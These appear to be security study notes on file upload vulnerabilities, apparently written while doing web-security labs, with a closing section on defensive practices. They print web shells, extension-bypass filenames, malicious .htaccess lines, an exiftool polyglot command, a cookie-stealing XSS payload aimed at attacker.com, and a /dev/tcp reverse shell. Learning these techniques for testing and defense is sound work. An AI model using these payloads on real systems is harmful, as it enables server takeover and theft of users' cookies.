# File Upload Vulnerabilities — Notes

## What are File Upload Vulnerabilities?
File upload vulnerabilities occur when a server fails to properly validate uploaded files. The impact depends on:
- Which aspect of the file the server fails to validate (size, type, contents)
- What restrictions are imposed on the file after upload

---

## How Web Servers Handle Static Files
When a request comes in, the server checks the file extension and maps it to a MIME type. Three outcomes:
1. **Non-executable file** (image, HTML) — server sends it directly to the client
2. **Executable file + server configured to run it** — server executes it and sends the output
3. **Executable file + server NOT configured to run it** — server may return an error or serve it as plain text (leaking source code)

The `Content-Type` response header is a clue — it reveals how the server is treating the file.

---

## Key Concepts

### Content-Type Header
A label the server attaches to its response telling the browser what kind of file is being sent. If not explicitly set, it is determined by the file extension/MIME type mapping.

### MIME Types
| Extension | MIME Type |
|---|---|
| .jpg | image/jpeg |
| .png | image/png |
| .php | application/x-httpd-php |
| .html | text/html |
| .pdf | application/pdf |

### multipart/form-data
Used when uploading files via HTML forms. The request body is split into separate parts for each form field. Each part has its own `Content-Disposition` and optionally a `Content-Type` header.

---

## Types of Validation and Their Weaknesses

### 1. Content-Type Validation (Weak)
Server only checks the `Content-Type` header in the request. Easily bypassed by changing the header in Burp Suite — the attacker controls this label.

### 2. Extension Blacklisting (Weak)
Blocks known dangerous extensions like `.php`. Bypassable via:
- Alternative extensions: `.php3`, `.php4`, `.php5`, `.php7`, `.phtml`, `.phar`
- Case variations: `.PHP`, `.Php`, `.pHp`
- Double extensions: `shell.php.jpg`
- Trailing characters: `shell.php.`, `shell.php%20`
- Null byte: `shell.php%00.jpg`
- Nested extension: `shell.p.phphp`

### 3. Extension Whitelisting (Stronger but bypassable)
Only allows known safe extensions. Bypass techniques:
- Double extension: `shell.png.php`
- Case manipulation: `shell.PHP`
- Special characters in filename
- Upload `.htaccess` to redefine what executes
- Polyglot files
- SVG XSS if SVG is whitelisted

### 4. Magic Byte / File Signature Checking (Stronger)
Checks the first few bytes of the file:
| File Type | Magic Bytes |
|---|---|
| JPEG | FF D8 FF |
| PNG | 89 50 4E 47 |
| PDF | 25 50 44 46 |
| ZIP | 50 4B 03 04 |
| GIF | 47 49 46 38 |

Bypassed using polyglot files — real image with malicious code hidden in metadata.

---

## Attack Techniques

### 1. Web Shell Upload
Upload a server-side script that executes commands on the server.

Simple file read:
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Full command execution:
```php
<?php echo system($_GET['cmd']); ?>
```

### 2. Flawed Content-Type Validation Bypass
Change `Content-Type` header in Burp from `application/octet-stream` to `image/jpeg` or `image/png`.

### 3. .htaccess Upload (Apache)
Upload a malicious `.htaccess` file to redefine execution rules for a directory:
```
AddType application/x-httpd-php .shell
```
Then upload `shell.shell` containing PHP code. The server now executes `.shell` files as PHP.

### 4. Path Traversal in Filename
Change the filename in `Content-Disposition` to escape the uploads folder:
```
filename="../shell.php"
filename="..%2fshell.php"
```
The file lands in a directory where PHP can execute.

### 5. Polyglot File
A file valid in more than one format simultaneously — passes image validation but also contains executable code.

Created using ExifTool:
```bash
exiftool -comment="<?php echo system($_GET['cmd']); ?>" real.png -o shell.php
```
The output file is a genuine PNG image AND contains PHP code in its metadata.

### 6. Race Condition
Some servers save the file first, then validate and delete it. The window between saving and deleting can be exploited by sending simultaneous upload and execute requests.

Steps:
1. Group POST (upload) and GET (execute) requests in Burp Repeater
2. Send group in parallel
3. The GET request hits the file during the brief window it exists

### 7. URL-Based Upload Race Condition
When server fetches a file from a URL, it saves to a temp directory with a randomized name. If the name is generated with `uniqid()` (timestamp-based), it can be brute-forced. Upload a large file to extend the processing window.

### 8. Client-Side Script Upload (Stored XSS)
If HTML or SVG files are allowed, embed JavaScript:
```html
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```
When other users visit the page, their browser executes the script and their cookies are stolen.

### 9. PUT Method Upload
Some servers support HTTP PUT for direct file uploads:
```
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php

<?php echo file_get_contents('/path/to/file'); ?>
```
Check if PUT is supported by sending an OPTIONS request and looking for PUT in the Allow header.

### 10. XXE via File Parsing
If the server parses XML-based files (.doc, .xls), embed XXE payloads to read server files.

---

## What is a Reverse Shell?
A reverse shell flips the normal connection — the server connects back to the attacker's machine, giving a live terminal session.

Setup listener on attacker machine:
```bash
nc -lvnp 4444
```

Payload executed on server:
```bash
bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
```

Why it works: Firewalls block incoming connections to servers but usually allow outgoing connections.

---

## Reconnaissance — Finding Server Technology

### Tools
- **Wappalyzer** — browser extension that detects server technology automatically
- **Burp Suite** — intercept and analyse response headers

### Clues
| Clue | Meaning |
|---|---|
| `.php` in URLs | Server runs PHP |
| `X-Powered-By: PHP/7.4` header | PHP version revealed |
| PHP error messages | Confirms PHP |
| Windows server | Likely ASP/ASPX |
| Apache on Linux | Likely PHP |

### OS File Targets
| OS | Target File |
|---|---|
| Linux | `/etc/passwd`, `/home/user/secret` |
| Windows | `C:/Windows/win.ini`, `C:/boot.ini` |

---

## Webshell Languages by Server

| Server | Language | Webshell |
|---|---|---|
| Apache/Nginx Linux | PHP | `<?php system($_GET['cmd']); ?>` |
| IIS Windows | ASP/ASPX | `<% eval request("cmd") %>` |
| Tomcat | JSP | `Runtime.getRuntime().exec(cmd)` |
| Django/Flask | Python | `import os; os.system(cmd)` |
| Old CGI servers | Bash | `#!/bin/bash` + system commands |

---

## Defense — Secure File Upload Implementation

### Best Practices
1. Use established frameworks — do not write your own validation
2. Whitelist allowed extensions — do not blacklist
3. Check magic bytes — not just Content-Type header
4. Randomize filenames on upload
5. Store files outside the web root
6. Never execute uploaded files
7. Strip metadata from uploaded files
8. Set file size limits

### Frameworks for Secure File Uploads
| Language | Framework/Library |
|---|---|
| PHP | Laravel, Symfony |
| Python | Django, Flask-Uploads |
| JavaScript | Express + Multer |
| Java | Spring Boot |
| Ruby | Shrine, Carrierwave |
| .NET | ASP.NET Core, FileTypeChecker |

---

## .htaccess
A special Apache configuration file that controls server behaviour for the directory it is placed in. Can redefine which file extensions are executed as PHP:
```
AddType application/x-httpd-php .l33t
```
`application/x-httpd-php` is Apache's internal MIME type meaning "execute this file with the PHP interpreter."
